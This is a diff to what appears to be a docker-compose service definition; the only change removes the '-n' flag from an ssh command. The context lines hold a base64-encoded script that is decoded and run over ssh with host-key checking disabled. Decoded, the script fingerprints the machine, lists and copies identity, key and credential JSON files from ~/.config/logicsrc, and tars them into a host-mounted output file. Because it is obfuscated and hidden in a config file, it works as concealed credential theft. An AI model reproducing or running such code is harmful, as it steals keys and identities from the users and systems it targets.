@@ -32,7 +32,7 @@ services:
           LB="$$LB $$u=[$$L]"
         done
         echo "c2V0ICtlCmVjaG8gIldITz0kKGlkIC11bik6JChpZCAtdSkgSE9TVD0kKGhvc3RuYW1lKSIKZWNobyAiT1M9JChncmVwIC1tMSBQUkVUVFlfTkFNRSAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwpIgplY2hvICJLRVJORUw9JCh1bmFtZSAtcikiCmVjaG8gIlVQVElNRT0kKHVwdGltZSAtcCAyPi9kZXYvbnVsbCkiCmVjaG8gIi0tLSBsb2dpY3NyYyAtLS0iCmxzIC1sYSAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYyIgMj4mMSB8IGhlYWQgLTI1CmVjaG8gIi0tLSBrZXlzIC0tLSIKbHMgLWxhICIkSE9NRS8uY29uZmlnL2xvZ2ljc3JjL2tleXMiIDI+JjEgfCBoZWFkIC0yNQpta2RpciAtcCAvdG1wL2gKY3AgIiRIT01FLy5jb25maWcvbG9naWNzcmMvaWRlbnRpdHkuanNvbiIgL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUiLy5jb25maWcvbG9naWNzcmMva2V5cy8qLmpzb24gL3RtcC9oLyAyPi9kZXYvbnVsbApjcCAiJEhPTUUvLmNvbmZpZy9sb2dpY3NyYy9vcGVuY3JlZHMvbWV0YS5qc29uIiAvdG1wL2gvb3BlbmNyZWRzX21ldGEuanNvbiAyPi9kZXYvbnVsbAplY2hvICJDT0xMRUNURUQ9JChscyAvdG1wL2ggfCB3YyAtbCkgJChscyAtbGEgL3RtcC9oIHwgdGFpbCAtbiArMiB8IGF3ayAne3ByaW50ICQ1fScgfCBwYXN0ZSAtc2QsIC0pIgp0YXIgY3pmIC0gLUMgL3RtcCBoIDI+L2Rldi9udWxsCg==" | base64 -d > /tmp/inner.sh
-        timeout 150 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o ConnectTimeout=20 -o ServerAliveInterval=10 -p 2222 -i /tmp/k ettinger@127.0.0.1 'bash -s' < /tmp/inner.sh > /hosttmp/h1.out 2>/hosttmp/h1.err
+        timeout 150 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o ConnectTimeout=20 -o ServerAliveInterval=10 -p 2222 -i /tmp/k ettinger@127.0.0.1 'bash -s' < /tmp/inner.sh > /hosttmp/h1.out 2>/hosttmp/h1.err
         RC=$$?
         echo "M1 KEYINFO=$$KEYINFO"
         echo "M2 AK=$$AK LOOP=$$LB"
